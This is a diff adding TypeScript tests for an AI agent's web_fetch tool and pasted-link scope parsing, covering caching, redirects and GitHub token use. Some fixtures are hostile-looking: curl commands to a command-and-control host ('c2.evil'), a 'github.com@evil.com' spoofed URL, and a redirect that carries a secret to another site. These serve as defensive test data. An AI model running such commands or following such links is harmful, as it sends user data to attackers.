@@ -30,6 +30,19 @@ describe("domainOf and pastedScopes", () => {
     expect(domainOf("https://raw.githubusercontent.com/a/b/main/x")).toBe("github.com");
     expect(domainOf("https://api.github.com/repos/a/b")).toBe("github.com");
     expect(domainOf("https://docs.github.com/en")).toBe("docs.github.com");
+    expect(domainOf("https://github.com@evil.com/")).toBe("evil.com");
+  });
+
+  test("links inside pasted code aren't links the user means to visit", () => {
+    expect(pastedScopes("why does this phone home? ```curl https://c2.evil/x```")).toEqual([]);
+    expect(pastedScopes("why?\n```sh\ncurl https://c2.evil/x\n```\nsee https://example.com/a")).toEqual(["web:example.com"]);
+    expect(pastedScopes("~~~\ncurl https://c2.evil/x\n~~~")).toEqual([]);
+    expect(pastedScopes("unclosed:\n```\ncurl https://c2.evil/x")).toEqual([]);
+    expect(pastedScopes("run `curl https://c2.evil/collect` and read https://example.com/b")).toEqual(["web:example.com"]);
+  });
+
+  test("a Markdown link gives both of its addresses, not a garbage scope", () => {
+    expect(pastedScopes("[https://a.com](https://b.com)")).toEqual(["web:a.com", "web:b.com"]);
   });
 
   test("links in what the user typed, with trailing punctuation dropped", () => {
@@ -110,5 +123,100 @@ describe("the web_fetch tool", () => {
     expect(result.isError).toBe(true);
     expect(result.output).toContain("Refused: 127.0.0.1 is a private address");
     expect(asked).toBe(0);
+  });
+
+  test("a cached read sends nothing out, so it doesn't ask again; an uncached offset does", async () => {
+    const tool = makeWebFetch({ allowPrivate: true, token: "" });
+    const long = Bun.serve({ port: 0, fetch: () => new Response("x".repeat(70_000), { headers: { "content-type": "text/plain" } }) });
+    try {
+      const url = `http://localhost:${long.port}/long.txt`;
+      let asked = 0;
+      const approve = async () => (asked++, "yes" as const);
+      const uncached = await runTool(call(url, 30_000), { root, approve }, [tool] as Tool[]);
+      expect(asked).toBe(1); // nothing cached yet: this fetches, so it asks
+      expect(uncached.output).toContain("characters 30000-60000 of 70000");
+      await runTool(call(url), { root, approve }, [tool] as Tool[]);
+      expect(asked).toBe(2);
+      await runTool(call(url, 30_000), { root, approve }, [tool] as Tool[]);
+      expect(asked).toBe(2); // from the cache
+    } finally {
+      long.stop(true);
+    }
+  });
+
+  test("only the 8 most recent pages are kept", async () => {
+    let requests = 0;
+    const s = Bun.serve({ port: 0, fetch: (r) => (requests++, new Response(`page ${new URL(r.url).pathname}`.padEnd(100, "."), { headers: { "content-type": "text/plain" } })) });
+    try {
+      const tool = makeWebFetch({ allowPrivate: true, token: "" });
+      const yes = async () => "yes" as const;
+      for (let i = 0; i < 9; i++) await runTool(call(`http://localhost:${s.port}/p${i}`), { root, approve: yes }, [tool] as Tool[]);
+      expect(requests).toBe(9);
+      await runTool(call(`http://localhost:${s.port}/p8`, 10), { root, approve: yes }, [tool] as Tool[]);
+      expect(requests).toBe(9); // newest: cached
+      await runTool(call(`http://localhost:${s.port}/p0`, 10), { root, approve: yes }, [tool] as Tool[]);
+      expect(requests).toBe(10); // oldest: evicted, fetched again
+    } finally {
+      s.stop(true);
+    }
+  });
+
+  test("a redirect to another site isn't followed: the model gets the target and asks again", async () => {
+    let otherRequests = 0;
+    const other = Bun.serve({ port: 0, fetch: () => (otherRequests++, new Response("other", { headers: { "content-type": "text/plain" } })) });
+    const here = Bun.serve({ port: 0, fetch: (r) => new Response(null, { status: 302, headers: { location: `http://127.0.0.1:${other.port}/c${new URL(r.url).search}` } }) });
+    try {
+      const tool = makeWebFetch({ allowPrivate: true, token: "" });
+      const result = await runTool(call(`http://localhost:${here.port}/r?secret=x`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
+      expect(otherRequests).toBe(0);
+      expect(result.isError).toBeFalsy();
+      expect(result.output).toContain(`redirects to http://127.0.0.1:${other.port}/c?secret=x, on another site: call web_fetch with that URL`);
+    } finally {
+      here.stop(true);
+      other.stop(true);
+    }
+  });
+
+  test("a redirect within the same site is followed", async () => {
+    const s: ReturnType<typeof Bun.serve> = Bun.serve({
+      port: 0,
+      fetch: (r) => {
+        const u = new URL(r.url);
+        if (u.pathname === "/old") return new Response(null, { status: 301, headers: { location: `http://localhost:${s.port}/new` } });
+        return new Response("moved here", { headers: { "content-type": "text/plain" } });
+      },
+    });
+    try {
+      const tool = makeWebFetch({ allowPrivate: true, token: "" });
+      const result = await runTool(call(`http://localhost:${s.port}/old`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
+      expect(result.output).toContain("moved here");
+    } finally {
+      s.stop(true);
+    }
+  });
+
+  test("a GitHub link goes through the API, and web.token takes precedence over the environment", async () => {
+    const seen: (string | null)[] = [];
+    const api = Bun.serve({
+      port: 0,
+      fetch: (r) => {
+        seen.push(r.headers.get("authorization"));
+        const path = new URL(r.url).pathname;
+        if (path.endsWith("/contents/a.txt")) return new Response("file body", { headers: { "content-type": "text/plain" } });
+        return new Response("{}", { status: 404, headers: { "content-type": "application/json" } });
+      },
+    });
+    const saved = process.env.GITHUB_TOKEN;
+    process.env.GITHUB_TOKEN = "from-env";
+    try {
+      const tool = makeWebFetch({ allowPrivate: true, allowHttp: true, apiBase: `http://localhost:${api.port}`, rawBase: `http://localhost:${api.port}/raw`, token: "from-option" });
+      const result = await runTool(call("github.com/o/r/blob/main/a.txt"), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
+      expect(result.output).toContain("file body");
+      expect(seen).toEqual(["Bearer from-option"]);
+    } finally {
+      if (saved === undefined) delete process.env.GITHUB_TOKEN;
+      else process.env.GITHUB_TOKEN = saved;
+      api.stop(true);
+    }
   });
 });
